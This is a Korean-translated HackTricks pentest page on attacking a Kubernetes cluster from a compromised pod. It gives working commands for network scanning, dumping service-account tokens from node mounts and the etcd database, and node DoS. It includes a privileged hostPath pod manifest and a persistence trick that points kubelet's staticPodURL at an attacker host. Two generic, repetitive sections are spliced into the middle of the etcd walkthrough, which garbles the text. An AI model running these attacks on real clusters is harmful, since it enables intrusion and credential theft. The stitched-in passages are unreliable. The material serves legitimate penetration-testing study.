# Attacking Kubernetes from inside a Pod

## Pod 내부에서 Kubernetes 공격하기

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)을 **팔로우**하세요.
* **Hacking 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 제출하세요.

</details>

### **Pod 탈출**

**운이 좋다면 노드로 탈출할 수 있을 수도 있습니다:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

#### Pod에서 탈출하기

Pod에서 탈출하기 위해선 먼저 **권한 상승**이 필요할 수 있습니다. 이를 위한 몇 가지 기술:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Compromised된 pod에서 **탈출을 시도**하기 위해 이 **도커 탈출**을 확인할 수 있습니다:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

#### Kubernetes Privileges 남용

**Kubernetes 열거**에 대해 설명한 섹션에서 설명한대로:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

일반적으로 pod는 내부에 **서비스 계정 토큰**을 실행합니다. 이 서비스 계정에는 클러스터 내에서 다른 pod로 **이동**하거나 심지어 **노드로 탈출**할 수 있는 **권한**이 부여될 수 있습니다. 다음에서 확인하세요:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

#### 클라우드 권한 남용

Pod가 **클라우드 환경**에서 실행된다면, **메타데이터 엔드포인트**에서 토큰을 **유출**하고 이를 사용하여 권한을 상승시킬 수 있을 수도 있습니다.

### 취약한 네트워크 서비스 검색

Kubernetes 환경 내부에 있으므로 현재 pod의 권한을 남용하여 권한 상승을 할 수 없고 컨테이너에서 탈출할 수 없는 경우, **잠재적으로 취약한 서비스를 검색**해야 합니다.

#### 서비스

**이를 위해 Kubernetes 환경의 모든 서비스를 가져올 수 있습니다:**

```
kubectl get svc --all-namespaces
```

기본적으로 Kubernetes는 평면 네트워킹 스키마를 사용합니다. 이는 클러스터 내의 **어떤 팟/서비스든 다른 팟/서비스와 통신할 수 있다는 것**을 의미합니다. 클러스터 내의 **네임스페이스는 기본적으로 네트워크 보안 제한이 없습니다**. 네임스페이스 내의 모든 사용자는 다른 네임스페이스와 통신할 수 있습니다.

#### 스캐닝

다음 Bash 스크립트( [Kubernetes 워크샵](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)에서 가져옴)는 Kubernetes 클러스터의 IP 범위를 설치하고 스캔합니다:

```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```

다음 페이지를 확인하여 **Kubernetes 특정 서비스를 공격**하여 **다른 팟/전체 환경을 침해**하는 방법을 배울 수 있습니다:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

#### 스니핑

**침해된 팟이 다른 팟이 인증해야 하는 민감한 서비스를 실행**하는 경우, **로컬 통신을 스니핑**하여 다른 팟에서 보내는 자격 증명을 얻을 수 있을 수도 있습니다.

### 네트워크 스푸핑

기본적으로 **ARP 스푸핑** (그리고 그로 인해 **DNS 스푸핑**)과 같은 기술은 Kubernetes 네트워크에서 작동합니다. 그런 다음, 팟 내에서는 기본적으로 **NET\_RAW 기능**이 있으므로 사용자 정의로 생성된 네트워크 패킷을 보낼 수 있으며, **동일한 노드에서 실행되는 모든 팟에 대해 ARP 스푸핑을 통한 MitM 공격을 수행**할 수 있습니다.\
또한, **악성 팟**이 **DNS 서버와 동일한 노드에서 실행**된다면, 클러스터의 모든 팟에 대해 **DNS 스푸핑 공격을 수행**할 수 있습니다.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

### 노드 DoS

Kubernetes 매니페스트에는 리소스에 대한 명시적인 사양이 없으며, 컨테이너에 대한 **적용된 제한 범위가 없습니다**. 공격자로서, 우리는 **팟/배포가 실행되는 리소스를 모두 소비**하여 다른 리소스를 고갈시키고 환경에 대한 DoS를 유발할 수 있습니다.

이 작업은 [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng)와 같은 도구를 사용하여 수행할 수 있습니다:

```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```

`stress-ng`를 실행하는 동안과 이후의 차이점을 확인할 수 있습니다.

```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```

### 노드 후행 작업

컨테이너에서 탈출에 성공했다면 노드에서 다음과 같은 흥미로운 사항을 발견할 수 있습니다:

* 컨테이너 런타임 프로세스 (Docker)
* 이와 같은 노드에서 실행 중인 더 많은 팟/컨테이너 (더 많은 토큰을 얻을 수 있음)
* 전체 파일 시스템 및 일반적인 운영 체제
* 수신 대기 중인 Kube-Proxy 서비스
* 수신 대기 중인 Kubelet 서비스. 구성 파일을 확인하세요:
* 디렉터리: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* 다른 Kubernetes 공통 파일:
* `$HOME/.kube/config` - 사용자 구성
* `/etc/kubernetes/kubelet.conf`- 일반 구성
* `/etc/kubernetes/bootstrap-kubelet.conf` - 부트스트랩 구성
* `/etc/kubernetes/manifests/etcd.yaml` - etcd 구성
* `/etc/kubernetes/pki` - Kubernetes 키

#### 노드 kubeconfig 찾기

이전에 언급한 경로 중 하나에서 kubeconfig 파일을 찾을 수 없는 경우 kubelet 프로세스의 `--kubeconfig` 인자를 확인하세요:

```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```

#### 비밀 정보 도난

To steal secrets from within a pod, you can use various techniques depending on the specific scenario. Here are a few common methods:

1. **Pod-to-Pod Communication**: If the target pod communicates with other pods, you can intercept the network traffic to capture sensitive information. This can be done by deploying a malicious pod in the same network namespace and using tools like Wireshark or tcpdump to capture the traffic.
2. **Pod-to-Service Communication**: Similarly, if the target pod communicates with services within the cluster, you can intercept the traffic to steal secrets. By deploying a malicious pod and configuring it as a service, you can redirect the traffic to capture the desired information.
3. **Exploiting Vulnerabilities**: If the target pod has any known vulnerabilities, you can exploit them to gain unauthorized access and steal secrets. This could involve exploiting misconfigurations, weak authentication mechanisms, or outdated software versions.
4. **Accessing Mounted Volumes**: If the pod has mounted volumes, you can access the files stored within them to steal secrets. By gaining access to the pod's filesystem, you can search for sensitive files or configuration files that may contain valuable information.

Remember, these techniques should only be used for ethical purposes, such as penetration testing or securing your own infrastructure. Unauthorized access or data theft is illegal and can have severe consequences.

```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```

스크립트 [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh)은 자동으로 **다른 팟의 토큰을 가져와서 원하는 권한이 있는지 확인**합니다 (1개씩 확인하는 대신).

```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```

#### 특권 DaemonSets

DaemonSet은 클러스터의 모든 노드에서 실행되는 팟입니다. 따라서, 특권 서비스 계정으로 구성된 DaemonSet의 토큰을 모든 노드에서 찾을 수 있으며 이를 악용할 수 있습니다.

이 취약점은 이전 섹션과 동일하지만, 이제 운이 아닌 다른 방법을 사용합니다.

#### 클라우드로의 피벗

클러스터가 클라우드 서비스로 관리되는 경우, 노드는 팟과는 다른 메타데이터 엔드포인트에 대한 액세스 권한을 가지고 있습니다. 따라서, 노드에서 메타데이터 엔드포인트에 액세스하려고 시도하세요 (또는 hostNetwork가 True로 설정된 팟에서):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

#### etcd 도용

컨테이너를 실행할 노드의 [nodeName](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node)을 지정할 수 있다면, 제어 플레인 노드 내에서 쉘을 얻고 etcd 데이터베이스를 얻을 수 있습니다:

```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```

제어 평면 노드는 **마스터 역할**을 갖고 있으며, **클라우드 관리 클러스터에서는 해당 노드에서 아무 작업도 실행할 수 없습니다**.

**etcd에서 시크릿 읽기**

파드 스펙의 `nodeName` 선택기를 사용하여 제어 평면 노드에서 파드를 실행할 수 있다면, 모든 구성 및 시크릿을 포함한 클러스터의 모든 구성을 포함하는 `etcd` 데이터베이스에 쉽게 액세스할 수 있습니다.

아래는 현재 사용 중인 제어 평면 노드에서 `etcd`에서 시크릿을 가져오는 빠르고 간단한 방법입니다. `etcd` 클라이언트 유틸리티인 `etcdctl`을 사용하여 제어 평면 노드의 자격 증명을 사용하여 어디에서든 실행 중인 etcd에 연결하는 더 우아한 솔루션을 원한다면, @mauilion의 [이 예제 매니페스트](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml)를 확인하세요.

**제어 평면 노드에서 `etcd`가 실행 중인지 확인하고 데이터베이스가 어디에 있는지 확인하세요 (`kubeadm`으로 생성된 클러스터에서)**

```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```

## Pod 내부에서 Kubernetes 공격하기

이 문서에서는 Kubernetes 클러스터 내부에서 Pod 내부에서 공격하는 방법에 대해 설명합니다. 이러한 공격은 Pod 내부에서 실행되는 컨테이너의 권한을 이용하여 Kubernetes 클러스터 전체에 악영향을 미칠 수 있습니다.

### 1. Pod 내부에서의 권한 상승

Pod 내부에서 권한 상승을 시도하는 첫 번째 단계는 현재 실행 중인 컨테이너의 권한 수준을 확인하는 것입니다. 이를 위해 다음 명령을 실행합니다.

```bash
$ id
```

컨테이너의 사용자 ID와 그룹 ID를 확인할 수 있습니다. 이 정보를 사용하여 권한 상승을 시도할 수 있습니다.

### 2. Pod 내부에서의 클러스터 권한 확장

Pod 내부에서 실행되는 컨테이너는 기본적으로 클러스터의 일부 권한을 가지고 있습니다. 이를 이용하여 클러스터 내부에서 다양한 작업을 수행할 수 있습니다.

예를 들어, `kubectl` 명령을 사용하여 클러스터 리소스를 관리할 수 있습니다. 다음 명령을 실행하여 현재 클러스터의 상태를 확인할 수 있습니다.

```bash
$ kubectl cluster-info
```

또한, `kubectl`을 사용하여 클러스터 내부의 다른 Pod에 대한 정보를 얻을 수도 있습니다. 다음 명령을 실행하여 현재 클러스터의 Pod 목록을 확인할 수 있습니다.

```bash
$ kubectl get pods --all-namespaces
```

### 3. Pod 내부에서의 네트워크 탐색

Pod 내부에서 실행되는 컨테이너는 클러스터 내부의 다른 Pod 및 서비스에 대한 네트워크 액세스 권한을 가지고 있습니다. 이를 이용하여 클러스터 내부의 네트워크를 탐색하고 다른 Pod 또는 서비스에 대한 공격을 수행할 수 있습니다.

예를 들어, `ping` 명령을 사용하여 다른 Pod 또는 서비스의 IP 주소를 확인할 수 있습니다. 다음 명령을 실행하여 특정 Pod 또는 서비스의 IP 주소를 확인할 수 있습니다.

```bash
$ ping <pod 또는 서비스 IP 주소>
```

### 4. Pod 내부에서의 데이터 유출

Pod 내부에서 실행되는 컨테이너는 클러스터 내부의 데이터에 액세스할 수 있습니다. 이를 이용하여 클러스터 내부의 데이터를 유출할 수 있습니다.

예를 들어, `curl` 명령을 사용하여 특정 URL에서 데이터를 가져올 수 있습니다. 다음 명령을 실행하여 특정 URL에서 데이터를 가져올 수 있습니다.

```bash
$ curl <URL>
```

### 5. Pod 내부에서의 악성 컨테이너 실행

Pod 내부에서 실행되는 컨테이너는 클러스터 내부에서 악성 컨테이너를 실행할 수 있습니다. 이를 이용하여 클러스터 내부에서 악성 활동을 수행할 수 있습니다.

예를 들어, `docker run` 명령을 사용하여 악성 컨테이너를 실행할 수 있습니다. 다음 명령을 실행하여 악성 컨테이너를 실행할 수 있습니다.

```bash
$ docker run <이미지>
```

### 결론

Pod 내부에서 Kubernetes 클러스터를 공격하는 것은 매우 위험한 작업입니다. 이러한 공격을 방지하기 위해 Pod의 보안을 강화하고 적절한 접근 제어를 구현해야 합니다.

```bash
data-dir=/var/lib/etcd
```

**etcd 데이터베이스의 데이터 보기:**

```bash
kubectl exec -it <pod_name> -- sh
ETCDCTL_API=3 etcdctl get --prefix "" --keys-only --from-key / | grep -v '\/$'
```

위 명령어를 사용하여 etcd 데이터베이스에서 데이터를 확인할 수 있습니다.

```bash
strings /var/lib/etcd/member/snap/db | less
```

**데이터베이스에서 토큰을 추출하고 서비스 계정 이름을 표시합니다**

```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```

**동일한 명령어지만 kube-system 네임스페이스에서 기본 토큰만 반환하는 몇 가지 greps가 추가되었습니다**

```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```

## Pod 내부에서 Kubernetes 공격하기

이 문서에서는 Kubernetes 클러스터 내부에서 Pod 내부에서 공격하는 방법에 대해 설명합니다. 이러한 공격은 Pod 내부에서 실행되는 컨테이너의 권한을 이용하여 Kubernetes 클러스터 전체에 악영향을 미칠 수 있습니다.

### 1. Pod 내부에서의 권한 상승

Pod 내부에서 권한 상승을 시도하는 첫 번째 단계는 현재 실행 중인 컨테이너의 권한 수준을 확인하는 것입니다. 이를 위해 다음 명령을 실행합니다.

```bash
$ id
```

컨테이너의 사용자 ID와 그룹 ID를 확인할 수 있습니다. 이 정보를 사용하여 권한 상승을 시도할 수 있습니다.

### 2. Pod 내부에서의 클러스터 권한 확장

Pod 내부에서 실행되는 컨테이너는 기본적으로 클러스터 내부의 다른 리소스에 액세스할 수 없습니다. 그러나 몇 가지 방법을 사용하여 이러한 제한을 우회할 수 있습니다.

#### 2.1. Service Account 토큰 탈취

Pod 내부에서 실행되는 컨테이너는 Service Account 토큰을 사용하여 클러스터 리소스에 액세스할 수 있습니다. 이 토큰을 탈취하여 클러스터 권한을 확장할 수 있습니다.

```bash
$ cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

위 명령을 실행하여 Service Account 토큰을 확인할 수 있습니다.

#### 2.2. 클러스터 DNS 탈취

Pod 내부에서 실행되는 컨테이너는 클러스터 DNS에 액세스할 수 있습니다. 이를 통해 클러스터 내부의 다른 리소스에 액세스할 수 있습니다.

```bash
$ cat /etc/resolv.conf
```

위 명령을 실행하여 클러스터 DNS 서버의 IP 주소를 확인할 수 있습니다.

### 3. Pod 내부에서의 컨테이너 간 공격

Pod 내부에서 실행되는 컨테이너는 동일한 네트워크 네임스페이스와 IPC 네임스페이스를 공유합니다. 이를 이용하여 다른 컨테이너에 대한 공격을 수행할 수 있습니다.

#### 3.1. IPC 네임스페이스 공유

```bash
$ ls -l /proc/1/ns/ipc
```

위 명령을 실행하여 현재 컨테이너의 IPC 네임스페이스를 확인할 수 있습니다. 이 정보를 사용하여 다른 컨테이너의 IPC 네임스페이스에 액세스할 수 있습니다.

#### 3.2. 네트워크 네임스페이스 공유

```bash
$ ls -l /proc/1/ns/net
```

위 명령을 실행하여 현재 컨테이너의 네트워크 네임스페이스를 확인할 수 있습니다. 이 정보를 사용하여 다른 컨테이너의 네트워크 네임스페이스에 액세스할 수 있습니다.

### 4. Pod 내부에서의 컨테이너 외부 공격

Pod 내부에서 실행되는 컨테이너는 클러스터 외부의 다른 리소스에 액세스할 수 있습니다. 이를 이용하여 외부 리소스에 대한 공격을 수행할 수 있습니다.

#### 4.1. 외부 서비스 공격

Pod 내부에서 실행되는 컨테이너는 외부 서비스에 액세스할 수 있습니다. 이를 통해 외부 서비스에 대한 공격을 수행할 수 있습니다.

#### 4.2. 외부 인터넷 공격

Pod 내부에서 실행되는 컨테이너는 외부 인터넷에 액세스할 수 있습니다. 이를 통해 외부 인터넷에 대한 공격을 수행할 수 있습니다.

### 5. Pod 내부에서의 데이터 누출

Pod 내부에서 실행되는 컨테이너는 클러스터 내부의 데이터에 액세스할 수 있습니다. 이를 이용하여 데이터를 누출할 수 있습니다.

#### 5.1. 파일 시스템 누출

Pod 내부에서 실행되는 컨테이너는 파일 시스템에 액세스할 수 있습니다. 이를 통해 파일 시스템의 데이터를 누출할 수 있습니다.

#### 5.2. 환경 변수 누출

Pod 내부에서 실행되는 컨테이너는 환경 변수에 액세스할 수 있습니다. 이를 통해 환경 변수의 데이터를 누출할 수 있습니다.

#### 5.3. 로그 누출

Pod 내부에서 실행되는 컨테이너는 로그 파일에 액세스할 수 있습니다. 이를 통해 로그 파일의 데이터를 누출할 수 있습니다.

이러한 공격 기술을 사용하여 Pod 내부에서 Kubernetes 클러스터를 공격할 수 있습니다. 그러나 이러한 공격은 합법적인 펜테스팅 활동의 일부로 수행되어야 하며, 무단으로 수행하는 것은 불법입니다.

```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```

#### 정적/미러링된 파드 지속성

\_정적 파드\_는 API 서버가 관찰하지 않고 특정 노드의 kubelet 데몬에 의해 직접 관리됩니다. 배포와 같은 제어 평면에 의해 관리되는 파드와 달리, **kubelet은 각 정적 파드를 감시하고 실패 시 다시 시작합니다**.

따라서 정적 파드는 항상 특정 노드의 **하나의 Kubelet에 바인딩**됩니다.

**kubelet은 각 정적 파드에 대해 Kubernetes API 서버에 미러 파드를 자동으로 생성**하려고 시도합니다. 이는 노드에서 실행되는 파드가 API 서버에서 볼 수 있지만 거기에서 제어할 수 없음을 의미합니다. 파드 이름은 노드 호스트 이름과 하이픈으로 시작하는 접미사가 붙습니다.

{% hint style="danger" %}
정적 파드의 **`spec`은 다른 API 객체를 참조할 수 없습니다** (예: ServiceAccount, ConfigMap, Secret 등). 따라서 현재 노드에서 임의의 serviceAccount를 사용하여 클러스터를 침해하기 위해 이 동작을 악용할 수 없습니다. 그러나 이를 사용하여 다른 네임스페이스에서 파드를 실행할 수 있습니다 (필요한 경우).
{% endhint %}

노드 호스트 내부에 있다면 **자체적으로 정적 파드를 생성**할 수 있습니다. 이는 **kube-system**과 같은 다른 네임스페이스에 파드를 생성할 수 있게 해주므로 매우 유용합니다.

정적 파드를 생성하려면 [**문서가 큰 도움이 됩니다**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). 기본적으로 2가지가 필요합니다:

* **kubelet 서비스** 또는 **kubelet 구성**([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration))에서 **`--pod-manifest-path=/etc/kubernetes/manifests`** 매개변수를 구성하고 서비스를 다시 시작합니다.
* \*\*`/etc/kubernetes/manifests`\*\*의 **파드 정의**에 정의를 생성합니다.

**더 은밀한 방법은 다음과 같습니다:**

* **kubelet** 구성 파일에서 **`staticPodURL`** 매개변수를 수정하고 `staticPodURL: http://attacker.com:8765/pod.yaml`와 같이 설정합니다. 이렇게 하면 kubelet 프로세스가 지정된 URL에서 **구성을 가져와 정적 파드를 생성**합니다.

**예시**로 [**여기**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)에서 가져온 **kube-system**에 특권 파드를 생성하기 위한 **파드** 구성의 예시입니다.

```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```

#### 파드 삭제 + 예약 불가능한 노드

만약 공격자가 **노드를 침해**하고 다른 노드에서 **파드를 삭제**하고 **다른 노드에서 파드를 실행할 수 없게 만들 수 있다면**, 파드는 침해된 노드에서 다시 실행되며 그 안에서 실행되는 토큰을 **훔칠 수 있습니다**.\
[**자세한 정보는 이 링크를 따르세요**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

### 자동 도구

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)

```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```

* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왑**](https://peass.creator-spring.com)을 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**을** 팔로우하세요.
* **Hacking 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 저장소에 제출하세요.**

</details>
